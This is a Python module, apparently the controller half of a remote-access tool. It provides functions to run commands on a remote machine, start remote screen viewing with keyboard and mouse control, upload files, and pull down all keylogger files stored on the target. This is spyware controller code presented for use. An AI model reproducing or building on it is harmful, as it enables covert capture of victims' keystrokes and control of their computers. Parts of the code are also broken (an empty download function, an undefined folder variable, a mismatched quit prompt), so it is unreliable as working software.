import os
import sys
import time
import socket
import threading
import multiprocessing
import screen_client
import datetime
import blessed

sys.path.insert(0, os.path.dirname(os.path.realpath(__file__)))

from conf import *
from screen_client import *


def client_global(client_c):
    """ This function will make the client a global variable. """
    globals()["client"] = client_c

def upload_file(filename, server):
    """ This function will upload a file to the server. """
    filesize = os.path.getsize(filename)
    globals()["client"].file_give(filename, filesize, server)

# Screen/Desktop viewing functions
def start_screen(remote_keyboard = False, remote_mouse = False):
    """ This will start the screen client. Remote mouse and remote keyboard can be toggled with the use of boolean toggles present in the function arguments. By default, they are set to zero. """
    ip_addr = globals()["client"].addr[0]
    server_callsign = globals()["client"].server_callsign

    # Start it!
    p = multiprocessing.Process(target=screen_client.main, args=(ip_addr, server_callsign, remote_keyboard, remote_mouse))
    p.start()

    globals()["screen_process"] = p

    # Let them know which options they toggled.
    print("Started the screen process, with remote keyboard set to {rkb} and remote mouse set to {rms}".format(
        rkb = remote_keyboard,
        rms = remote_mouse
    ))

def stop_screen():
    """ Kill the screen client. Note: this doesn't always work. """
    if (not globals()["screen_process"]):
        print("The screen process never existed!")
        return

    globals()["screen_process"].terminate()


# Keylogs
def download_keylog(keylog_name):
    """ Download a keylog name of your choice. """
    c = globals()["client"]
    keylog_folder = c.get_keylog_folder().rstrip()

def download_keylogs():
    """ Downloads all of the keylogs. Well, sometimes it might get stuck! """
    """ -----------------------------------------------------------^"""
    """ | """
    """ > is because of how the Server will continually send files, while the Client is waiting. """
    """ Be careful! """

    c = globals()["client"]
    keylog_folder = c.get_keylog_folder().rstrip()

    # Get the directory contents of the keylogger folder.
    _keylogs = c.send_command("print(':'.join(os.listdir(KEYLOGGER_FOLDER_LOCATION)))")
    keylogs = _keylogs.split(":")

    # We change these attributes so that we can allow overwriting and so we can change the download folder
    c._file_get_overwrite = True
    c._file_get_location_change = True
    c._file_get_location = keylog_dir

    for keylog in keylogs:
        c.file_request(keylog_folder + keylog.rstrip())
        
        if (input("Enter anything to download the next file (only do this if it has downloaded). Or type quit to stop") == "stop"):
            break

    # Change them back
    c._file_get_overwrite = False
    c._file_get_location_change = False
    

def clear():
    """ Clear the screen """
    os.system("clear")


def dprint(text):
    """ Function for printing debug information """
    if (not SHOW_DEBUG):
        return
    
    t = blessed.Terminal()
    print(t.red_bold("@DEBUG: {t}".format(t = text)))


def h():
    print("-- HELP --")

    for item in help_menu:
        print ("{item}: {value}".format(
            item = item,
            value = help_menu[item]
        ))
    

    